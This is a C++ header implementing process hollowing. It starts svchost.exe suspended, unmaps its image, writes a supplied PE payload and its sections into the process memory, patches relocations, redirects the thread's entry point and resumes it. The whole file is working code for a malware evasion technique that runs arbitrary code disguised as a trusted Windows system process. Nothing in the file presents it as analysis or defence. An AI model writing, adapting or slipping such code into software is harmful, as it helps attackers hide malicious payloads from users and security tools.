#pragma once

#include <windows.h>
#include "Internals.h"
#include "PE.h"

class ProcessHollowing
{
public:
	static HANDLE CreateHollowedProcess(void* image)
	{
		LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
		LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();

		char filepath[MAX_PATH];
		GetWindowsDirectoryA(filepath, sizeof(filepath));
		strcat(filepath, "\\SysWOW64\\svchost.exe");

		CreateProcessA
		(
			filepath,
			0,
			0,
			0,
			0,
			CREATE_SUSPENDED,
			0,
			0,
			pStartupInfo,
			pProcessInfo
		);

		if (!pProcessInfo->hProcess)
			return INVALID_HANDLE_VALUE;

		PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);

		PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);

		PLOADED_IMAGE pSourceImage = GetLoadedImage(DWORD(image));

		PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders(DWORD(image));

		HMODULE hNTDLL = GetModuleHandleA("ntdll");

		FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

		_NtUnmapViewOfSection NtUnmapViewOfSection =
			(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

		DWORD dwResult = NtUnmapViewOfSection
		(
			pProcessInfo->hProcess,
			pPEB->ImageBaseAddress
		);

		if (dwResult)
			return INVALID_HANDLE_VALUE;

		PVOID pRemoteImage = VirtualAllocEx
		(
			pProcessInfo->hProcess,
			pPEB->ImageBaseAddress,
			pSourceHeaders->OptionalHeader.SizeOfImage,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE
		);

		if (!pRemoteImage)
			return INVALID_HANDLE_VALUE;

		DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress -
			pSourceHeaders->OptionalHeader.ImageBase;

		pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;

		if (!WriteProcessMemory
		(
			pProcessInfo->hProcess,
			pPEB->ImageBaseAddress,
			image,
			pSourceHeaders->OptionalHeader.SizeOfHeaders,
			0
		))
		{
			return INVALID_HANDLE_VALUE;
		}

		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			if (!pSourceImage->Sections[x].PointerToRawData)
				continue;

			PVOID pSectionDestination =
				(PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);

			if (!WriteProcessMemory
			(
				pProcessInfo->hProcess,
				pSectionDestination,
				LPVOID((DWORD(image) + pSourceImage->Sections[x].PointerToRawData)),
				pSourceImage->Sections[x].SizeOfRawData,
				0
			))
			{
				return INVALID_HANDLE_VALUE;
			}
		}

		if (dwDelta)
		{
			for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
			{
				auto pSectionName = ".reloc";

				if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
					continue;

				DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
				DWORD dwOffset = 0;

				IMAGE_DATA_DIRECTORY relocData =
					pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

				while (dwOffset < relocData.Size)
				{
					PBASE_RELOCATION_BLOCK pBlockheader =
						(PBASE_RELOCATION_BLOCK)(DWORD(image) + (dwRelocAddr + dwOffset));

					dwOffset += sizeof(BASE_RELOCATION_BLOCK);

					DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

					PBASE_RELOCATION_ENTRY pBlocks =
						(PBASE_RELOCATION_ENTRY)(DWORD(image) + (dwRelocAddr + dwOffset));

					for (DWORD y = 0; y < dwEntryCount; y++)
					{
						dwOffset += sizeof(BASE_RELOCATION_ENTRY);

						if (pBlocks[y].Type == 0)
							continue;

						DWORD dwFieldAddress =
							pBlockheader->PageAddress + pBlocks[y].Offset;

						DWORD dwBuffer = 0;
						ReadProcessMemory
						(
							pProcessInfo->hProcess,
							(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
							&dwBuffer,
							sizeof(DWORD),
							0
						);
						
						dwBuffer += dwDelta;

						BOOL bSuccess = WriteProcessMemory
						(
							pProcessInfo->hProcess,
							(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
							&dwBuffer,
							sizeof(DWORD),
							0
						);

						if (!bSuccess)
							continue;
					}
				}

				break;
			}
		}
		
		DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +
			pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

		LPCONTEXT pContext = new CONTEXT();
		pContext->ContextFlags = CONTEXT_INTEGER;

		if (!GetThreadContext(pProcessInfo->hThread, pContext))
			return INVALID_HANDLE_VALUE;

		pContext->Eax = dwEntrypoint;

		if (!SetThreadContext(pProcessInfo->hThread, pContext))
			return INVALID_HANDLE_VALUE;

		if (!ResumeThread(pProcessInfo->hThread))
			return INVALID_HANDLE_VALUE;

		return pProcessInfo->hProcess;
	}
};